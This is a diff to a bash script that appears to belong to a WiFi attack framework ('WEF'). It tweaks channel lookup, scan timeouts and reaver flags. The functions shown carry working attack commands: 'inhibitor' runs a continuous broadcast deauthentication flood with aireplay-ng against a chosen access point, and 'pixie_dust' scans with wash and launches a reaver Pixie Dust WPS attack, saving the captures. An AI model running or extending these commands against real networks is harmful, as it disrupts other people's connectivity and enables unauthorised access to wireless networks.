@@ -370,9 +370,9 @@ function chipsets_panel(){
 # Check the interface mode
 function check_interface_mode(){
 	if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')" == "Arch" ]; then
-		echo $(iwconfig ${netCard} | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/')
+		iwconfig ${netCard} | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/'
 	else
-		echo $(iw dev ${netCard} info | grep 'type' | awk '{print $2}')
+		iw dev ${netCard} info | grep 'type' | awk '{print $2}'
 	fi
 }
 
@@ -821,10 +821,10 @@ function inhibitor(){
 	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Getting channel of the AP${endColour}"
 	test -f scan_output
 	if [ "$(echo $?)" == "0" ]; then
-		channel_to_inhibite=$(cat scan_output | grep -i "${ap_to_inhibite}$" | awk '{print $2}')
+		channel_to_inhibite=$(cat scan_output | grep -i "${ap_to_inhibite}$" | head -n 1 | awk '{print $2}')
 		sleep 0.2
 	else
-		channel_to_inhibite=$(timeout 14 bash -c "wash -2 -5 -a -i ${netCard}" | grep -i "${ap_to_inhibite}$" | awk '{print $2}')
+		channel_to_inhibite=$(timeout 14 bash -c "wash -2 -5 -a -i ${netCard}" | grep -i "${ap_to_inhibite}$" | head -n 1 | awk '{print $2}')
 	fi
 
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting inhibition${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"; sleep 0.3; echo -ne "${blueColour}.${endColour}"
@@ -833,6 +833,7 @@ function inhibitor(){
 	if [ "$verbose" == "0" ]; then
 		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
 	elif [ "$verbose" == "1" ]; then
+		echo
 		aireplay-ng -0 0 -e "${ap_to_inhibite}" -c FF:FF:FF:FF:FF:FF ${netCard}
 	fi
 	sleep 0.1
@@ -1136,7 +1137,7 @@ function pixie_dust(){
 	sleep 0.3
 
 	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
-	timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+	timeout 26 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
 
 	echo
 	ask_data2
@@ -1146,7 +1147,7 @@ function pixie_dust(){
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Pixie Dust attack...${endColour}\n"
 	sleep 0.3
-	timeout 100 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -K 1 -vv"
+	timeout 80 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -K 1 -vv -g 5"
 	sleep 0.3
 
 	mkdir "/opt/wef/main/captures/$name/" 2>/dev/null
